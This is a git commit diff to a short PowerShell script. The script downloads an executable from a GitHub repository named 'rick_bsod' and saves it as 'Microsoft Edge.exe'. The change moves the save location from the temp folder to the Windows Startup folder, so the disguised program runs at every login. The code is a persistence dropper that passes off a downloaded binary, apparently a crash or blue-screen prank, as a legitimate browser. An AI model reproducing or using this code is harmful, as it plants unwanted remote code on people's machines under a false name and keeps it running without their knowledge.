e3ca889f490fb165430ead4af7c746e1719d0440
discordl78-ops <discordl78@onet.pl>
2026-05-13 10:42:49 +0200

    Update micro.ps1

--- micro.ps1
+++ micro.ps1
@@ -1,5 +1,5 @@
 $url = "https://github.com/discordl78-ops/rick_bsod/raw/refs/heads/main/Microsoft%20Edge.exe"
-$outputPath = "$env:TEMP\Microsoft Edge.exe"
+$outputPath = "$env:APPDATA\Microsoft\Windows\Start Menu\Programs\Startup\Microsoft Edge.exe"
 
 Invoke-WebRequest -Uri $url -OutFile $outputPath
 
